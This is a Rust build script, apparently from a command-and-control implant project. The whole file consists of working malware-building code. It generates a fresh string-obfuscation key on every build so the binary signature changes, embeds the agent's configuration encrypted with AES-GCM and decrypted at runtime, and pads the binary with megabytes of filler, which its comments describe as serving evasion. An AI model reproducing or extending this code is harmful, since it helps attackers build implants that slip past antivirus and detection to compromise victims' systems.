// ./build.rs
use std::env;
use std::fs::{self, File};
use std::io::{BufWriter, Write};
use std::path::Path;
use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    
    // --- 1. POLYMORPHISM: Generate Random LitCrypt Key ---
    // This ensures every build uses a unique key for string obfuscation,
    // changing the binary signature even if the code hasn't changed.
    let mut rng = thread_rng();
    let litcrypt_key: String = (0..64)
        .map(|_| rng.sample(Alphanumeric) as char)
        .collect();

    // Pass the key to the compiler environment for this build only.
    // The 'lc!' macro in lib.rs will use this to encrypt strings at compile time.
    println!("cargo:rustc-env=LITCRYPT_ENCRYPT_KEY={}", litcrypt_key);
    
    // OPTIONAL: Uncomment to force a full rebuild (and new key) every time.
    // Without this, cargo will cache the binary unless code/env changes.
    // println!("cargo:rerun-if-changed=build.rs"); 

    // --- 2. Configuration Embedding ---
    // Checks if the Builder passed a configuration via env var.
    println!("cargo:rerun-if-env-changed=C2_BUILD_CONFIG");

    let env_val = env::var("C2_BUILD_CONFIG").unwrap_or_default();
    
    // Default empty config if compiling without the Builder (e.g. `cargo check`)
    let config_data = if env_val.is_empty() {
        serde_json::json!({ "bloat_mb": 0 }) 
    } else {
        serde_json::from_str(&env_val).expect("Invalid JSON in C2_BUILD_CONFIG")
    };

    let bloat_mb = config_data["bloat_mb"].as_u64().unwrap_or(0) as usize;

    // Generate the Rust source file that contains the encrypted config constants
    let config_dest_path = Path::new(&out_dir).join("obfuscated_config.rs");
    let mut conf_code = String::new();

    if let (Some(key), Some(nonce), Some(cipher)) = (
        config_data["key_hex"].as_str(),
        config_data["nonce_hex"].as_str(),
        config_data["cipher_hex"].as_str()
    ) {
        let key_bytes = hex::decode(key).expect("Invalid Key Hex");
        let nonce_bytes = hex::decode(nonce).expect("Invalid Nonce Hex");
        let cipher_bytes = hex::decode(cipher).expect("Invalid Cipher Hex");

        // We generate code that uses aes_gcm to decrypt at runtime.
        // The key is hardcoded into the binary here, but since the binary itself
        // is what needs the config, this is expected behavior for a standalone agent.
        conf_code.push_str("use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};\n");
        conf_code.push_str(&format!("const CONFIG_KEY: [u8; 32] = {:?};\n", key_bytes));
        conf_code.push_str(&format!("const CONFIG_NONCE: [u8; 12] = {:?};\n", nonce_bytes));
        conf_code.push_str(&format!("const CONFIG_CIPHER: [u8; {}] = {:?};\n", cipher_bytes.len(), cipher_bytes));

        conf_code.push_str("pub fn get_config() -> String {\n");
        conf_code.push_str("    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&CONFIG_KEY);\n");
        conf_code.push_str("    let cipher = Aes256Gcm::new(key);\n");
        conf_code.push_str("    let nonce = aes_gcm::Nonce::from_slice(&CONFIG_NONCE);\n");
        conf_code.push_str("    let plaintext = cipher.decrypt(nonce, CONFIG_CIPHER.as_ref()).expect(\"Config Decrypt Failed\");\n");
        conf_code.push_str("    String::from_utf8(plaintext).unwrap()\n");
        conf_code.push_str("}\n");
    } else {
        // Fallback for dev builds
        conf_code.push_str("pub fn get_config() -> String { String::new() }\n");
    }

    fs::write(&config_dest_path, conf_code).expect("Failed to write config artifact");

    // --- 3. Bloat Generation ---
    let bloat_rs_path = Path::new(&out_dir).join("bloat_data.rs");
    let mut rs_code = String::new();

    if bloat_mb > 0 {
        let bloat_txt_path = Path::new(&out_dir).join("bloat.txt");
        let target_bytes = bloat_mb * 1024 * 1024;
        let file = File::create(&bloat_txt_path).unwrap();
        let mut writer = BufWriter::new(file);
        let chunk = [0u8; 1024]; // Zeroes are compressible, but efficient to write. 
                                 // For better evasion, random data is preferred but slower to generate at build time.
        
        // Writing null bytes for speed; compiler/linker might strip this if not careful,
        // hence the volatile read in the generated code below.
        let mut current = 0;
        while current < target_bytes {
            writer.write_all(&chunk).unwrap();
            current += 1024;
        }
        writer.flush().unwrap();

        rs_code.push_str("pub const BENIGN_DATA: &str = include_str!(concat!(env!(\"OUT_DIR\"), \"/bloat.txt\"));\n");
        // Force the compiler to keep the variable by reading it volatilely at runtime
        rs_code.push_str("pub fn use_bloat() { if !BENIGN_DATA.is_empty() { unsafe { std::ptr::read_volatile(&BENIGN_DATA.as_bytes()[0]); } } }\n");
    } else {
        rs_code.push_str("pub fn use_bloat() {}\n");
    }
    fs::write(&bloat_rs_path, rs_code).unwrap();
}
